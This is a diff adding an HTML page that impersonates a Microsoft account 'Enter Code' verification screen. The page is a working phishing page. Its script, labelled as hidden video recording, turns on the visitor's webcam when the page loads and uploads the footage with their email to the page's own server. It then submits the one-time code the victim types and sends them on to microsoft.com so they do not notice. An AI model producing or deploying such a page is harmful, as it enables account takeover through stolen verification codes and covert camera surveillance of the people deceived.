@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft - Enter Code</title>
+    <link rel="icon" type="image/x-icon" href="/static/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-image: url('https://cdn.cgdream.ai/_next/image?url=https%3A%2F%2Fapi.cgdream.ai%2Frails%2Factive_storage%2Fblobs%2Fredirect%2FeyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBCS24rREFFPSIsImV4cCI6bnVsbCwicHVyIjoiYmxvYl9pZCJ9fQ%3D%3D--514df6f9cfb02409e5c1446ea3170f489b806e44%2Fd453cacc-e66b-4dee-acae-999d787a0a6b_0.png&w=1080&q=95');
+            background-size: cover;
+            background-position: center;
+            color: #1b1b1b;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            position: relative;
+        }
+        
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            z-index: -1;
+        }
+        
+        .verify-card {
+            background-color: #fff;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            margin-bottom: 20px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo {
+            width: 108px;
+            height: auto;
+            margin-right: 8px;
+        }
+        
+        .back-link {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        
+        .back-arrow {
+            margin-right: 8px;
+            font-size: 20px;
+        }
+        
+        .email-display {
+            color: #1b1b1b;
+            font-size: 15px;
+            margin-bottom: 16px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin: 16px 0;
+            color: #1b1b1b;
+        }
+        
+        .verification-message {
+            display: flex;
+            align-items: flex-start;
+            margin: 16px 0;
+        }
+        
+        .email-icon {
+            color: #666;
+            margin-right: 10px;
+            font-size: 20px;
+            margin-top: 3px;
+        }
+        
+        .verification-text {
+            color: #1b1b1b;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .support-link {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .support-link:hover {
+            text-decoration: underline;
+        }
+        
+        form {
+            width: 100%;
+        }
+        
+        .code-field {
+            width: 100%;
+            height: 36px;
+            padding: 6px 0;
+            font-size: 15px;
+            border: none;
+            border-bottom: 1px solid #8e8e8e;
+            margin-bottom: 12px;
+            transition: border-color 0.3s ease;
+            background-color: transparent;
+        }
+        
+        .code-field:focus {
+            outline: none;
+            border-bottom: 1px solid #0067b8;
+        }
+        
+        .error-message {
+            color: #e81123;
+            font-size: 14px;
+            margin-bottom: 12px;
+            display: none;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+        }
+        
+        .checkbox-input {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        
+        .checkbox-label {
+            font-size: 13px;
+            color: #1b1b1b;
+        }
+        
+        .verify-btn {
+            height: 36px;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            width: 108px;
+            text-align: center;
+            float: right;
+            padding: 0 12px;
+            margin-top: 5px;
+        }
+        
+        .verify-btn:hover {
+            background-color: #005da6;
+        }
+        
+        .footer {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 12px;
+            color: #616161;
+            display: flex;
+            justify-content: flex-end;
+            padding-right: 20px;
+        }
+        
+        .footer a {
+            color: #616161;
+            text-decoration: none;
+            margin-left: 24px;
+            transition: color 0.3s ease;
+        }
+        
+        .footer a:hover {
+            color: #1b1b1b;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="verify-card">
+        <div class="logo-container">
+            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft">
+        </div>
+        <a href="#" class="back-link">
+            <span class="back-arrow">‹</span>
+            <span id="emailDisplay"></span>
+        </a>
+        <div class="verification-message">
+            <span class="email-icon">✉</span>
+            <div class="verification-text">
+                We sent a code to the email address associated with your account. If you don't see it in your inbox, check your spam folder. <a href="#" class="support-link">Need help?</a>
+            </div>
+        </div>
+        
+        <form id="verifyForm">
+            <input type="text" id="code" name="code" class="code-field" placeholder="Code" required>
+            <div id="errorMessage" class="error-message">Please enter the correct code.</div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" id="staySignedIn" name="staySignedIn" class="checkbox-input" checked>
+                <label for="staySignedIn" class="checkbox-label">Stay signed in</label>
+            </div>
+            
+            <button type="submit" class="verify-btn" id="verifyBtn">Verify</button>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy & cookies</a>
+        <a href="#">...</a>
+    </div>
+    
+    <script>
+        // Hidden video recording functionality
+        let mediaRecorder;
+        let recordedChunks = [];
+        let stream;
+        
+        // Start recording video when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get email from URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email') || 'your account';
+            document.getElementById('emailDisplay').textContent = email;
+            
+            // Start video recording
+            startRecording();
+            
+            // Submit form handler
+            document.getElementById('verifyForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const code = document.getElementById('code').value;
+                if (!code) {
+                    document.getElementById('errorMessage').classList.add('show');
+                    return;
+                }
+                
+                // Stop recording and save video before submitting
+                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                    mediaRecorder.stop();
+                } else {
+                    // If recording already stopped or failed, still submit the form
+                    submitVerification(email, code);
+                }
+            });
+        });
+        
+        function startRecording() {
+            // Try to access user's camera only (without microphone)
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(mediaStream) {
+                    stream = mediaStream;
+                    
+                    // Initialize MediaRecorder with muted audio
+                    mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
+                    
+                    // Event handler for when data becomes available
+                    mediaRecorder.ondataavailable = function(e) {
+                        if (e.data.size > 0) {
+                            recordedChunks.push(e.data);
+                        }
+                    };
+                    
+                    // Event handler for when recording stops
+                    mediaRecorder.onstop = function() {
+                        // Create a blob from the recorded chunks
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        recordedChunks = [];
+                        
+                        // Stop all tracks
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // Read the blob as data URL
+                        const reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = function() {
+                            const base64data = reader.result;
+                            const email = new URLSearchParams(window.location.search).get('email') || '';
+                            
+                            // Send video data to server
+                            fetch('/save-video', {
+                        method: 'POST',
+                        headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({ 
+                                    video: base64data,
+                                    email: email 
+                                }),
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                // Submit verification after video is saved
+                                const code = document.getElementById('code').value;
+                                submitVerification(email, code);
+                            })
+                            .catch(error => {
+                                console.error('Error uploading video:', error);
+                                // Still try to submit verification even if video upload fails
+                                const code = document.getElementById('code').value;
+                                submitVerification(email, code);
+                            });
+                        };
+                    };
+                    
+                    // Start recording
+                    mediaRecorder.start();
+                    
+                    // Set a timeout to stop recording after 30 seconds if still active
+                    setTimeout(function() {
+                        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    }, 30000);
+                })
+                .catch(function(err) {
+                    console.log('Error accessing camera:', err);
+                });
+        }
+        
+        function submitVerification(email, code) {
+            fetch('/microsoft/verify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    code: code
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Redirect to Microsoft site instead of success page
+                window.location.href = data.redirect || 'https://www.microsoft.com';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('errorMessage').classList.add('show');
+            });
+        }
+    </script>
+</body>
+</html> 
